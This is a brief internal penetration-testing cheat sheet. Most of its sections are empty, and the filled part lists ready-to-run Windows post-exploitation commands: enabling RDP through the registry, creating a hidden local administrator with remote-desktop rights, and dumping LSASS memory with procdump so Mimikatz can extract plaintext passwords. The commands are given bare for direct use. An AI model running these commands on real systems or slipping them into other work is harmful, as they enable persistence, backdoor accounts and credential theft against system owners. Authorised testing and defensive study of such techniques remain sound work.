# Internal Pen test cheetsheet

## Recon




## Exploitation


## Post-Exploitation


## Useful shit

### Enable RDP from CMD
```
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

### Create localadmin
```
net user *username* *password* /add
net localgroup administrators *username* /add
net localgroup "Remote Desktop Users" *username* /add
```

### Procdump LSASS for creds
This creates a memory dump using the procdump sysinternals tool. 
#### 32bit
`C:\temp\procdump.exe -accepteula -ma lsass.exe lsass.dmp`
#### 64bit
`C:\temp\procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp`
#### Mimikatz Extaction
```
sekurlsa::minidump lsass.dmp
sekurlsa::passwords full
```
